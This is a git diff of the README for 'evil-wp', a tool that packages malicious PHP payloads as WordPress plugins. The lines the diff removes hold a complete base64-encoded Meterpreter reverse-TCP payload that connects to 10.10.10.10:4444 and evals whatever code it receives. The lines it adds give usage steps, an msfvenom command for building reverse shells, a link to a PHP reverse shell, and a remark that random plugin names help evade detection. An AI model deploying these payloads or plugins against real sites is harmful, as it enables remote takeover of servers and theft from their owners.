@@ -1,16 +1,42 @@
 # evil-wp
-A project to wrap malicous PHP payloads into a WordPress plugin.
+This is a small project to wrap malicous PHP payloads into a WordPress plugin.
 
-TODO: organize this better, provide usage, etc.
+Random name generation is thrown in for fun and a slight attempt at reducing detection by template pattern matching.
 
-$ msfconsole -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e php/base64 -f raw
+## Pre-Requisites
+This attack requires the ability to install plugins to the target WordPress installation.
 
-[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
-[-] No arch selected, selecting arch: php from the payload
-Found 1 compatible encoders
-Attempting to encode payload with 1 iterations of php/base64
-php/base64 succeeded with size 1508 (iteration=0)
-php/base64 chosen with final size 1508
-Payload size: 1508 bytes
-eval(base64_decode('Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjEwLjEwJzsgJHBvcnQgPSA0NDQ0OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNrKCJO.bGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs'));
+## Installation
+To install this simple tool, clone this repository and use pip to install the requirements.
 
+``` bash
+$ git clone https://github.com/svespie/evil-wp
+$ cd evil-wp
+$ pip install -r requirements.txt
+```
+
+Consider using a virtual environment as a matter of best practice.
+
+## Usage
+``` bash
+$ python evil-wp.py -h
+$ python evil-wp.py -n <plugin_name> -p "<payload>"
+```
+
+* the plugin name should be unique to the installation being attacked
+* the payload can be any valid PHP code
+
+
+## Example Payload Generation
+msfvenom is a great place to start with for generating PHP payloads.
+
+``` bash
+$ msfconsole -p php/meterpreter/reverse_tcp LHOST=<attacker_host LPORT=<listening_port> -e php/base64 -f raw
+```
+
+Any valid PHP will work, including traditional PHP reverse shell payloads such as this one: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.
+
+Good luck!
+
+## Similar Projects
+* https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py (a nifty tool that automates meterpreter use)
